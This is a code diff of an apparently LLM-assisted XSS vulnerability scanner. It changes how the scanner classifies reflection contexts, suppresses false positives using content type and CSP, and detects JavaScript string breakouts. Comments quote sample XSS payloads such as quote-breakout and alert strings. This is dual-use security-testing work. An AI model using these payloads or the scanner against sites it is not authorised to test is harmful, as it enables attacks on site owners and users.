-            await self._worker_pool.stop()
-            self._worker_pool = None
+        try:
+            if self._worker_pool:
+                await self._worker_pool.stop()
+                self._worker_pool = None
 
-        self.event_bus.unsubscribe(
-            EventType.WORK_QUEUED_XSS.value,
-            self._on_work_queued
-        )
+            self.event_bus.unsubscribe(
+                EventType.WORK_QUEUED_XSS.value,
+                self._on_work_queued
+            )
 
-        self._queue_mode = False
-        logger.info(f"[{self.name}] Queue consumer stopped")
+            self._queue_mode = False
+        finally:
+            # Pipeline exit for the queue-driven path (the one the API actually runs).
+            # In a finally because the caller gathers this with return_exceptions=True:
+            # a failure in worker-pool shutdown would otherwise leak the whole scan's
+            # documents for the lifetime of the process.
+            freed = release_document_caches()
+            logger.info(
+                f"[{self.name}] Queue consumer stopped; released document caches: {freed}")
 
     async def _on_work_queued(self, data: dict) -> None:
         """Handle work_queued_xss notification (logging only)."""
@@ -6129,13 +8473,16 @@ Return ONLY the payloads, one per line, no explanations."""
             finding_dict["evidence"]["root_cause"] = fingerprint[2]
             finding_dict["evidence"]["affected_urls"] = self._global_xss_findings[fingerprint]
 
-        self._emit_xss_finding(
+        emitted = self._emit_xss_finding(
             finding_dict,
             status=validation_status if isinstance(validation_status, str) else validation_status.value,
             needs_cdp=needs_cdp
         )
 
-        logger.info(f"[{self.name}] Confirmed XSS: {result.url}?{result.parameter}")
+        if emitted:
+            logger.info(f"[{self.name}] Confirmed XSS: {result.url}?{result.parameter}")
+        else:
+            logger.warning(f"[{self.name}] ⚠️  Confirmed XSS NOT emitted (rejected by _validate_before_emit): {result.url}?{result.parameter}")
 
     def get_queue_stats(self) -> dict:
         """Get queue consumer statistics."""
@@ -6199,6 +8546,13 @@ Return ONLY the payloads, one per line, no explanations."""
             logger.exception(f"XSSAgent error: {e}")
             dashboard.log(f"[{self.name}] ❌ Error: {e}", "ERROR")
             return {"findings": [], "error": str(e)}
+
+        finally:
+            # Pipeline exit: the response bodies memoized by the confirmation predicates
+            # are dead weight from here on, and this process outlives the scan.
+            freed = release_document_caches()
+            logger.debug(
+                f"[{self.name}] Released document caches at run_loop exit: {freed}")
 
 
     async def _probe_and_analyze_context(
@@ -7038,33 +9392,51 @@ Return ONLY the payloads, one per line, no explanations."""
             # Return empty HTML but valid URL to ensure the loop continues
             return "", probe_url, 0
 
-    def _analyze_reflection_context(self, html: str, probe_prefix: str) -> Dict:
+    def _analyze_reflection_context(
+        self, html: str, probe_prefix: str, marker: Optional[str] = None
+    ) -> Dict:
+        """Analyze WHERE a probe reflected in `html`.
+
+        `marker` is the literal string to LOCATE in the document. It defaults to
+        `_LEGACY_PROBE_MARKER` rather than to `probe_prefix` ON PURPOSE: four of this
+        method's six call sites pass a full PAYLOAD as `probe_prefix` (an LLM payload, a
+        reflecting payload, the multi-char PROBE_STRING), and a payload is exactly the
+        thing the server mangles, so searching for it verbatim would flip those sites from
+        reflected=True to reflected=False — a silent recall regression. Callers that hold a
+        real, survives-serialisation MARKER pass it explicitly; L1 does, which is what makes
+        `url_context`/`href` reachable at all (the OMNI marker is not `BT7331`, so the
+        hardcoded search always said "none" and the browser-only hatch could never open).
+
+        Returns `contexts`: EVERY label the probe reflected in, not only the ranked winner.
+        Collapsing to one label is what hid `url_context` (ranked 8th of 9) behind an inert
+        html_text copy of the same value.
         """
-        Analyze the reflection point of the probe.
-        Advanced context analysis technique.
-        """
-        prefix = "BT7331"
+        search = marker or _LEGACY_PROBE_MARKER
         is_blocked = self._is_waf_blocked(html)
 
         # Early return if probe not reflected
-        if prefix not in html:
+        if search not in (html or ""):
             return {
                 "reflected": False,
                 "is_blocked": is_blocked,
-                "context": "blocked" if is_blocked else "none"
+                "context": "blocked" if is_blocked else "none",
+                "contexts": [],
             }
 
-        # Detect surviving characters
-        surviving = self._detect_surviving_chars(html, prefix)
-
-        # Find context via BeautifulSoup
-        context = self._find_reflection_context(html, prefix)
+        # Find every context via BeautifulSoup, then rank.
+        # NOTE: no "surviving_chars" key is emitted here. Which characters survived can only
+        # be decided against what was SENT, which this method does not know — the L0.5
+        # delimited char probe measures it properly (self._surviving_chars). Omitting the
+        # key leaves every consumer on its own "unknown" default, which means "fire
+        # everything" (tag_closing_breakout_payloads, payload_batches) — never a narrower set.
+        contexts = self._find_reflection_contexts(html, search)
 
         return {
             "reflected": True,
-            "context": context,
+            "context": most_exploitable_context(contexts),
+            "contexts": contexts,
             "probe_found": True,
-            "surviving_chars": surviving,
+            "snippet": self._reflection_snippet(html, search),
             "is_blocked": is_blocked
         }
 
@@ -7074,38 +9446,92 @@ Return ONLY the payloads, one per line, no explanations."""
         block_signatures = ["blocked:", "waf block", "security violation", "forbidden", "not acceptable", "access denied"]
         return any(sig in lower_html for sig in block_signatures)
 
-    def _detect_surviving_chars(self, html: str, prefix: str) -> str:
-        """Detect which special characters survived reflection."""
-        test_chars = ["'", "\"", "<", ">", "&", "{", "}", "\\"]
-        surviving = ""
-        for char in test_chars:
-            if f"{prefix}{char}" in html or (char in html and prefix in html):
-                surviving += char
-        return surviving
+    def _reflection_snippet(self, html: str, marker: str) -> str:
+        """The HTML immediately around the first reflection of `marker`.
 
-    def _find_reflection_context(self, html: str, prefix: str) -> str:
-        """Find the HTML context where the probe was reflected."""
+        The L1 → L3 hand-off has always read a "snippet" key that nothing ever produced, so
+        the L3 LLM prompt received an EMPTY document sample for every parameter of every
+        scan. Returning the real window is what that caller already asks for.
+        """
+        idx = (html or "").find(marker)
+        if idx < 0:
+            return ""
+        start = max(0, idx - _REFLECTION_SNIPPET_RADIUS)
+        end = min(len(html), idx + len(marker) + _REFLECTION_SNIPPET_RADIUS)
+        return html[start:end]
+
+    def _find_reflection_contexts(self, html: str, prefix: str) -> List[str]:
+        """EVERY HTML context the probe reflected in — all text nodes AND all attributes.
+
+        A parameter commonly reflects in several places at once (page title, an
+        <input value="...">, an <a href="...">, the body). Attribute values are never
+        NavigableStrings, so find_all(string=...) can never see them: they are scanned
+        separately instead of only as a no-text-node fallback.
+
+        The full list is what callers that must not lose a signal need — most notably the
+        browser-only escalation hatch, for which a single `url_context` anywhere in the
+        list is decisive even though the ranking would bury it under html_text.
+        """
         from bs4 import BeautifulSoup
 
         try:
             soup = BeautifulSoup(html, 'html.parser')
-            text_node = soup.find(string=lambda t: t and prefix in t)
+            contexts = [
+                self._context_from_text_node(node)
+                for node in soup.find_all(string=lambda t: t and prefix in t)
+            ]
+            contexts.extend(self._contexts_from_soup_attributes(soup, prefix))
 
-            if text_node:
-                return self._context_from_text_node(text_node)
-            else:
-                return self._context_from_attributes(html, prefix)
+            if not contexts:
+                # Nothing parsed (malformed markup / probe inside an unparsed region):
+                # fall back to the raw-string attribute heuristics.
+                return [self._context_from_attributes(html, prefix)]
+
+            return contexts
 
         except Exception as e:
             logger.debug(f"operation failed: {e}")
-            return "unknown"
+            return ["unknown"]
 
     def _context_from_text_node(self, text_node) -> str:
         """Determine context from text node parent."""
-        parent = text_node.parent.name
+        from bs4 import Comment
+        # find_all(string=...) also returns comments — they are NavigableStrings too.
+        if isinstance(text_node, Comment):
+            return "comment"
+        parent = getattr(text_node.parent, "name", None)
         if parent in ['script', 'style']:
             return parent
+        # RCDATA/RAWTEXT elements (HTML standard): markup inside them is NOT parsed as
+        # tags, so this is text, not executable body HTML. Same vocabulary as the sibling
+        # pure module (agents/xss/analysis.py) so the labels stay consistent.
+        if parent in _RAW_TEXT_ELEMENTS:
+            return "raw_text"
         return "html_text"
+
+    def _contexts_from_soup_attributes(self, soup, prefix: str) -> List[str]:
+        """Context label for every ATTRIBUTE value carrying the probe."""
+        contexts: List[str] = []
+        for tag in soup.find_all(True):
+            for attr, value in (tag.attrs or {}).items():
+                # bs4 returns multi-valued attributes (class, rel, ...) as lists
+                raw = " ".join(v for v in value if isinstance(v, str)) if isinstance(value, list) else value
+                if not isinstance(raw, str) or prefix not in raw:
+                    continue
+                name = (attr or "").lower()
+                if name.startswith("on"):
+                    contexts.append("event_handler")
+                # The (element, attribute) PAIR decides this, not the attribute name: only
+                # attributes whose processing model is NAVIGATE can ever run a reflection,
+                # and `url_context` is what opens the browser-escalation hatch. Keying on
+                # the bare name labelled `<link rel=canonical href>` and `<img src>` — which
+                # FETCH, and are measurably inert — as browser-only, forcing a Playwright
+                # pass and a CDP session on an escaped reflection that can never execute.
+                elif (_element_name((tag.name or "").lower()), name) in _NAVIGATING_URL_ATTRIBUTES:
+                    contexts.append("url_context")
+                else:
+                    contexts.append("attribute_value")
+        return contexts
 
     def _context_from_attributes(self, html: str, prefix: str) -> str:
         """Determine context from attribute heuristics."""
@@ -7121,8 +9547,12 @@ Return ONLY the payloads, one per line, no explanations."""
         Filters and prioritizes payloads based on the detected reflection context.
         This prevents testing 800+ payloads when only ~50 are relevant.
         """
-        # For unknown/blocked contexts, use broader set
-        if context.startswith("unknown") or context in ["waf_blocked", "blocked"]:
+        # For unknown/blocked contexts, use broader set. Contexts without a dedicated
+        # relevance rule (raw_text, event_handler, url_context, ...) also take this path:
+        # falling through to _is_payload_relevant() would filter EVERYTHING out and leave
+        # only the 10-payload safety net, silently cutting recall.
+        if (context.startswith("unknown") or context in ["waf_blocked", "blocked"]
+                or context not in _FILTERABLE_CONTEXTS):
             return payloads[:100]
 
         # Filter by context relevance
@@ -7664,6 +10094,8 @@ Response Format (XML-Like):
                         text = await resp.text()
                         self._last_confirming_request = {"method": "POST", "url": base_url, "headers": dict(headers), "body": urlencode(post_data), "body_content_type": "application/x-www-form-urlencoded"}
                         self._last_response_content_type = resp.headers.get("Content-Type", "")
+                        self._last_response_csp = resp.headers.get(
+                            "Content-Security-Policy", "")
                         self._last_confirming_response = {"status": resp.status, "text": text}
                         return text
                 else:
@@ -7679,10 +10111,16 @@ Response Format (XML-Like):
                         text = await resp.text()
                         self._last_confirming_request = {"method": "GET", "url": attack_url, "headers": dict(headers), "body": None, "body_content_type": None}
                         self._last_response_content_type = resp.headers.get("Content-Type", "")
+                        self._last_response_csp = resp.headers.get(
+                            "Content-Security-Policy", "")
                         self._last_confirming_response = {"status": resp.status, "text": text}
                         return text
         except Exception:
             self._handle_send_error()
+            # Never leave the PREVIOUS response's content type behind: an empty one means
+            # "unknown", which the confirmation gate treats as executable (fail OPEN).
+            self._last_response_content_type = ""
+            self._last_response_csp = ""
             return ""
 
     async def _fast_reflection_check(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
@@ -7764,26 +10202,12 @@ Response Format (XML-Like):
                 return False
 
         # Tier 1.2: Accurate Context Analysis (checks for escaping)
-        # Uses new methods that verify payload is NOT neutered/escaped
-        if self._is_executable_in_html_context(payload, response_html):
-            evidence["http_confirmed"] = True
-            evidence["execution_context"] = "html_tag"
-            evidence["method"] = "L1: HTTP Static Reflection"
-            evidence["level"] = 1
-            evidence["status"] = "VALIDATED_CONFIRMED"
-            return True
-
-        if self._is_executable_in_event_handler(payload, response_html):
-            evidence["http_confirmed"] = True
-            evidence["execution_context"] = "event_handler"
-            evidence["method"] = "L1: HTTP Static Reflection"
-            evidence["level"] = 1
-            evidence["status"] = "VALIDATED_CONFIRMED"
-            return True
-
-        if self._is_executable_in_javascript_uri(payload, response_html):
-            evidence["http_confirmed"] = True
-            evidence["execution_context"] = "javascript_uri"
+        # Routed through the SAME gate every other level uses. Calling the individual
+        # predicates here skipped the content-type suppression, so an API-backed form that
+        # echoes the field into a JSON 422 body (DRF, Laravel, ProblemDetails) confirmed at
+        # L1 even though L2/L3 would have rejected it — and L1 also never checked the JS
+        # string breakout context, which is a straight recall gain.
+        if self._can_confirm_from_http_response(payload, response_html, evidence):
             evidence["method"] = "L1: HTTP Static Reflection"
             evidence["level"] = 1
             evidence["status"] = "VALIDATED_CONFIRMED"
@@ -8034,14 +10458,19 @@ Answer with ONLY one word: SI or NO"""
         Returns:
             True if XSS can be confirmed from HTTP response, False otherwise
         """
-        # Reflected HTML/JS only executes when the browser renders the response as HTML.
-        # If the endpoint returns application/json / text/plain / octet-stream, the payload is
-        # reflected but NEVER executed (e.g. the image API echoing ?file=<svg onload> inside a
-        # JSON error body) — confirming it would be a false positive.
-        _ct = (getattr(self, "_last_response_content_type", "") or "").lower()
-        if _ct and ("json" in _ct or _ct.startswith("text/plain") or "octet-stream" in _ct):
-            evidence["fp_suppressed"] = f"non-executable content-type: {_ct.split(';')[0].strip()}"
+        # Reflected HTML/JS only executes when the browser PARSES the response as a
+        # document. An ALLOWLIST, not the old 3-item denylist: json / text/plain /
+        # octet-stream left application/javascript, application/rss+xml, atom+xml,
+        # application/xml and text/xml executable, and "/?s=<payload>&feed=rss2" exists on
+        # every WordPress site. An absent/empty content type still passes — fail OPEN.
+        _ct = (getattr(self, "_last_response_content_type", "") or "").split(";")[0].strip().lower()
+        if _ct and _ct not in _EXECUTABLE_CONTENT_TYPES:
+            evidence["fp_suppressed"] = f"non-executable content-type: {_ct}"
             return False
+        # The XML content types are parsed by an XML parser, where `<x/>` really does close
+        # the element. In text/html that same solidus is ignored, so the two disagree about
+        # everything that follows an XHTML-style `<script src=a/>`.
+        self._response_is_xml = _ct in _XML_CONTENT_TYPES
         # Determine the executable context (if any), then stamp the confirming request ONCE.
         ctx = None
         if self._is_executable_in_html_context(payload, response_html):
@@ -8055,6 +10484,24 @@ Answer with ONLY one word: SI or NO"""
         elif self._is_executable_in_js_string_breakout(payload, response_html):
             # payload \';alert()// → server returns \\';alert()// inside <script> → code executes
             ctx = "js_string_breakout"
+
+        # CSP is consulted LAST, and only once something would otherwise be confirmed.
+        # Every payload this agent sends is inline script, so a policy that forbids inline
+        # script makes the reflection unexploitable by anything we can send — Chromium
+        # refuses to run it and prints "Refused to execute inline event handler". Both
+        # carriers are consulted: the enforcing response header and the document's own
+        # <meta http-equiv>. Asking here rather than up front keeps the cost off the
+        # dominant path: on a payload sweep almost every probe reflects nowhere at all,
+        # and those must not pay for a policy scan whose answer nobody would read.
+        if ctx:
+            try:
+                if (_csp_blocks_inline(getattr(self, "_last_response_csp", "") or "")
+                        or _csp_blocks_inline(_document_csp(response_html))):
+                    evidence["fp_suppressed"] = "CSP forbids inline script"
+                    evidence["http_confirmed"] = False
+                    return False
+            except Exception as e:  # unknown policy → fail OPEN
+                logger.debug(f"[{self.name}] CSP analysis failed, assuming executable: {e}")
 
         if ctx:
             evidence["http_confirmed"] = True
@@ -8089,96 +10536,89 @@ Answer with ONLY one word: SI or NO"""
 
     def _is_executable_in_html_context(self, payload: str, response_html: str) -> bool:
         """
-        Check if payload creates a new HTML tag that could execute JS.
+        Check if the payload lands somewhere the browser will parse it as markup.
 
-        Returns True only if:
-        - Payload contains < and > (to create a tag)
-        - These chars appear RAW (not as &lt; &gt;) in the response
-        - The context is outside of script tags
+        Returns True if ANY occurrence of the payload sits in an executable position, and
+        False only when EVERY occurrence is PROVABLY inert per the HTML tokenizer:
+        - inside an RCDATA/RAWTEXT element (title, textarea, script, style, ...) without
+          the matching close tag in the payload,
+        - inside a quoted attribute value whose delimiter the payload cannot escape,
+        - inside an HTML comment the payload cannot close,
+        - HTML-entity-escaped (&lt;/&quot;/&#60;) or percent-encoded inside a URL
+          attribute — those leave no raw occurrence at all.
+
+        Evaluating ALL occurrences is strictly BETTER for recall than the previous
+        first-occurrence-only check: a payload echoed into <title> AND into the page body
+        used to be judged on the <title> copy alone and silently rejected. It is also
+        better for precision: a reflection that only ever lands in <title> or in
+        <meta content="..."> no longer stamps http_confirmed.
+
+        The old implementation stripped <script> blocks before matching; that behaviour is
+        kept deliberately (script/style are part of the RCDATA/RAWTEXT set) but a payload
+        carrying its own </script> now correctly confirms as a breakout.
+
+        Fails OPEN: a parser error or an unrecognised position counts as executable — a
+        false positive is recoverable, a silently dropped vulnerability is not.
         """
-        # Must have tag-creating chars
-        if '<' not in payload or '>' not in payload:
-            return False
+        try:
+            occurrences = _reflection_occurrences(
+                response_html, payload, bool(getattr(self, "_response_is_xml", False)))
+        except Exception as e:
+            logger.debug(f"[{self.name}] Reflection classification failed, assuming executable: {e}")
+            return True
+        positions = [p for p, _t, _c, _h in occurrences]
 
-        # Check for raw payload outside of <script> blocks
-        # Remove script blocks from consideration
-        import re
-        html_without_scripts = re.sub(r'<script[^>]*>.*?</script>', '', response_html, flags=re.DOTALL | re.IGNORECASE)
+        if any(_position_executes(p, payload, tag, tail, host)
+               for p, tag, tail, host in occurrences):
+            return True
 
-        # Check if raw payload appears in the cleaned HTML
-        if payload not in html_without_scripts:
-            return False
+        # An <iframe srcdoc="..."> value is ENTITY-DECODED and then parsed as a whole HTML
+        # document, so an entity-escaped payload leaves no raw occurrence anywhere in the
+        # response and still executes. Nothing else can be rescued here: everywhere else
+        # entity encoding really is inertness.
+        try:
+            if "srcdoc" in _attribute_injection_contexts(response_html, payload):
+                return True
+        except Exception as e:  # unknown state → fail OPEN
+            logger.debug(f"[{self.name}] srcdoc analysis failed, assuming executable: {e}")
+            return True
 
-        # Verify < and > are NOT escaped at the payload location
-        # Find where payload appears and check surrounding context
-        pos = html_without_scripts.find(payload)
-        if pos == -1:
-            return False
-
-        # Check that we're not inside a JS string or HTML attribute value
-        # where the payload would be data, not code
-        # Look for the < char from our payload - it should NOT be preceded by &
-        payload_start = pos
-        check_start = max(0, payload_start - 10)
-        before_context = html_without_scripts[check_start:payload_start]
-
-        # If we see HTML encoding markers right before, it's escaped
-        if '&lt;' in before_context or '&quot;' in before_context:
-            return False
-
-        # Payload appears raw in HTML - likely executable
-        return True
+        if positions:
+            logger.debug(
+                f"[{self.name}] Reflection is inert in every position ({', '.join(sorted(set(positions)))}) "
+                f"- not confirming from HTTP: {payload[:60]}"
+            )
+        return False
 
     def _is_executable_in_event_handler(self, payload: str, response_html: str) -> bool:
         """
-        Check if payload can execute via event handler attribute.
+        Check if payload can execute via an event handler attribute (onclick="...").
 
-        Event handlers like onclick="PAYLOAD" execute JS.
-        But if payload's quotes are HTML-encoded, it won't break out.
+        The old `on\\w+\\s*=\\s*(["'])([^"']*?)PAYLOAD` regex could only ever match the
+        degenerate `onclick="PAYLOAD"` shape: `[^"']*?` cannot cross the JS string's own
+        opening quote, so `onclick="filter('PAYLOAD')"` — the standard admin-panel /
+        ASP.NET / JSF shape — never matched at all. The attribute is now located with the
+        HTML tokenizer and judged with the JS lexer.
         """
-        import re
-
-        # Look for payload in event handler context
-        # Pattern: on[event]="...[payload]..."
-        event_pattern = rf'on\w+\s*=\s*(["\'])([^"\']*?){re.escape(payload)}'
-        match = re.search(event_pattern, response_html, re.IGNORECASE)
-
-        if not match:
-            return False
-
-        # Check if payload breaks out of the attribute
-        # If payload contains the same quote type, it must NOT be escaped
-        quote_char = match.group(1)  # The quote used: " or '
-
-        if quote_char in payload:
-            # Check if quote in payload is HTML-encoded
-            encoded_quote = '&quot;' if quote_char == '"' else '&#39;'
-            payload_with_encoded = payload.replace(quote_char, encoded_quote)
-
-            # If the encoded version is what's in the response, payload is neutered
-            if payload_with_encoded in response_html:
-                return False
-
-        # Payload in event handler without proper encoding - executable
-        return True
+        try:
+            return "event_handler" in _attribute_injection_contexts(response_html, payload)
+        except Exception as e:  # unknown state → fail OPEN
+            logger.debug(f"[{self.name}] Event-handler analysis failed, assuming executable: {e}")
+            return True
 
     def _is_executable_in_javascript_uri(self, payload: str, response_html: str) -> bool:
         """
-        Check if payload can execute via javascript: URI.
+        Check if payload can execute via a javascript: URI (href="javascript:...").
 
-        href="javascript:PAYLOAD" executes when clicked.
+        Same fix as the event handler above: `javascript:[^"']*PAYLOAD` could not reach a
+        payload nested inside the URI's own JS string, and it only looked at href/src/action
+        instead of the whole URL-bearing attribute set.
         """
-        import re
-
-        # Pattern: href/src/action="javascript:...[payload]..."
-        if payload.lower().startswith('javascript:'):
-            # Payload is the full javascript: URI
-            pattern = rf'(href|src|action)\s*=\s*["\']?{re.escape(payload)}'
-        else:
-            # Payload is the code part
-            pattern = rf'(href|src|action)\s*=\s*["\']?javascript:[^"\']*{re.escape(payload)}'
-
-        return bool(re.search(pattern, response_html, re.IGNORECASE))
+        try:
+            return "javascript_uri" in _attribute_injection_contexts(response_html, payload)
+        except Exception as e:  # unknown state → fail OPEN
+            logger.debug(f"[{self.name}] javascript: URI analysis failed, assuming executable: {e}")
+            return True
 
     def _is_executable_in_template(self, payload: str, response_html: str) -> bool:
         """
@@ -8192,116 +10632,40 @@ Answer with ONLY one word: SI or NO"""
         # We can't confirm execution from HTTP alone
         return False
 
-    def _detect_js_string_delimiter(self, block: str, pos: int) -> str:
-        """Detect the JS string delimiter type that wraps the injection point.
-
-        Looks backward from pos to find the nearest string assignment pattern
-        (= '...' or = "...") that opened the JS string containing our injection.
-
-        Returns: "'" or '"' or "" (if unable to determine)
-        """
-        lookback_start = max(0, pos - 300)
-        lookback = block[lookback_start:pos]
-
-        # Find last occurrence of string assignment patterns
-        # e.g. `= '`, `= "`, `('`, `("`, `,'`, `,"`, `+ '`, `+ "`
-        last_single = -1
-        last_double = -1
-
-        for m in re.finditer(r"""[=\(,+]\s*'""", lookback):
-            last_single = m.end()
-        for m in re.finditer(r'''[=\(,+]\s*"''', lookback):
-            last_double = m.end()
-
-        if last_single > last_double:
-            return "'"
-        elif last_double > last_single:
-            return '"'
-        return ""
-
     def _is_executable_in_js_string_breakout(self, payload: str, response_html: str) -> bool:
         """
-        Check if payload achieves JS string breakout via backslash-quote pattern.
+        Check if the payload breaks out of a JS string inside an inline <script>.
 
-        TRUE breakout requires EVEN backslashes before the quote:
-          \\\\' → JS: \\\\ (literal backslash) + ' (free quote) = BREAKOUT
-          \\\\\\\\' → JS: \\\\\\\\ (two literal backslashes) + ' (free quote) = BREAKOUT
+        Handles the reflection shapes the payload does NOT survive verbatim — chiefly the
+        server that escapes backslashes, so `\\';alert(1)//` comes back as `\\\\';alert(1)//`.
+        (The verbatim shapes are already covered by the position classifier, which routes
+        <script> content through the SAME lexer.)
 
-        FALSE positive has ODD backslashes before the quote:
-          \\\\\\' → JS: \\\\ (literal backslash) + \\' (escaped quote) = NO BREAKOUT
-
-        This matters when a server escapes BOTH backslashes AND quotes:
-          Sent: \\"  Server: \\\\ + \\" = \\\\\\" (3 backslashes + quote = ODD = no breakout)
-        vs. a server that only escapes backslashes:
-          Sent: \\'  Server: \\\\ + ' = \\\\' (2 backslashes + quote = EVEN = breakout)
-
-        Additionally validates that the breakout quote type matches the JS string
-        delimiter: a ' breakout inside "..." is NOT a breakout (and vice versa).
+        The old implementation counted backslashes before every quote and guessed the
+        enclosing string delimiter with a 300-char backward regex. The lexer replaces both:
+        the backslash parity IS the escape handling in _js_scan_quoted, and the delimiter
+        is a fact of the token, not a guess. The two behaviours that must survive:
+          * `x\\\\';alert(1)//` — doubled backslash then a FREE quote → BREAKOUT
+          * `x\\\\\\';alert(1)//` — the quote itself got escaped → NOT a breakout
         """
-        # Map: (breakout sequence we send, quote character to look for)
-        breakout_checks = [
-            ("\\'", "'"),   # single quote breakout
-            ('\\"', '"'),   # double quote breakout
-        ]
-
-        for sent_seq, quote_char in breakout_checks:
-            if sent_seq not in payload:
-                continue
-
-            # Extract <script> blocks from response
-            script_blocks = re.findall(
-                r'<script[^>]*>(.*?)</script>', response_html,
-                re.DOTALL | re.IGNORECASE
-            )
-
-            # Extract the executable part of the payload (after the breakout)
-            exec_part = payload.split(sent_seq, 1)[1]  # e.g. "alert(document.domain)//"
-            if not exec_part:
-                continue
-
-            for block in script_blocks:
-                # Scan for every occurrence of the quote character
-                idx = 0
-                while idx < len(block):
-                    pos = block.find(quote_char, idx)
-                    if pos == -1:
-                        break
-
-                    # Count consecutive backslashes immediately before this quote
-                    bs_count = 0
-                    check_pos = pos - 1
-                    while check_pos >= 0 and block[check_pos] == '\\':
-                        bs_count += 1
-                        check_pos -= 1
-
-                    # Breakout condition: EVEN backslashes >= 2 before the quote
-                    # Even = all backslashes form \\ pairs (literal), quote is FREE
-                    # Odd = last backslash escapes the quote, NO breakout
-                    if bs_count >= 2 and bs_count % 2 == 0:
-                        # Verify quote type matches the JS string delimiter
-                        # e.g. ' breakout inside "..." is NOT a breakout
-                        delimiter = self._detect_js_string_delimiter(block, pos)
-                        if delimiter and quote_char != delimiter:
-                            logger.debug(
-                                f"[{self.name}] JS breakout rejected: "
-                                f"quote '{quote_char}' doesn't match "
-                                f"string delimiter '{delimiter}'"
-                            )
-                            idx = pos + 1
-                            continue
-
-                        # The executable part must appear AFTER this free quote
-                        after_quote = block[pos + 1:]
-                        if exec_part[:20] in after_quote:
+        try:
+            forms = _reflected_forms(payload)
+            for body, _ in _inline_script_bodies(response_html):
+                for form in forms:
+                    at = body.find(form)
+                    while at != -1:
+                        end = at + len(form)
+                        if (_js_span_escapes(body, at, end)
+                                and _js_breakout_parses(body, at, end)):
                             logger.info(
-                                f"[{self.name}] JS string breakout confirmed: "
-                                f"sent '{sent_seq}' → {bs_count} backslashes + free "
-                                f"{quote_char} + executable code '{exec_part[:30]}...'"
+                                f"[{self.name}] JS string breakout confirmed: reflected as "
+                                f"'{form[:40]}' in code position"
                             )
                             return True
-
-                    idx = pos + 1
-
+                        at = body.find(form, at + 1)
+        except Exception as e:  # unknown state → fail OPEN
+            logger.debug(f"[{self.name}] JS breakout analysis failed, assuming executable: {e}")
+            return True
         return False
 
     def _payload_reflects(self, payload: str, response: str) -> bool:
@@ -8633,9 +10997,25 @@ Answer with ONLY one word: SI or NO"""
                     ssl=False,
                     allow_redirects=True
                 ) as resp:
-                    return await resp.text()
+                    text = await resp.text()
+                    # This response reaches the confirmation gate through _validate();
+                    # without recording its content type the gate would judge it on the
+                    # LAST GET's headers, and without the request the repro stamp would
+                    # replay that GET instead of this POST.
+                    self._last_response_content_type = resp.headers.get("Content-Type", "")
+                    self._last_response_csp = resp.headers.get(
+                        "Content-Security-Policy", "")
+                    self._last_confirming_request = {
+                        "method": "POST", "url": form_action, "headers": dict(headers),
+                        "body": urllib.parse.urlencode(test_data),
+                        "body_content_type": "application/x-www-form-urlencoded",
+                    }
+                    self._last_confirming_response = {"status": resp.status, "text": text}
+                    return text
         except Exception as e:
             logger.debug(f"POST request failed: {e}")
+            self._last_response_content_type = ""
+            self._last_response_csp = ""
             return None
 
     def _post_build_finding(
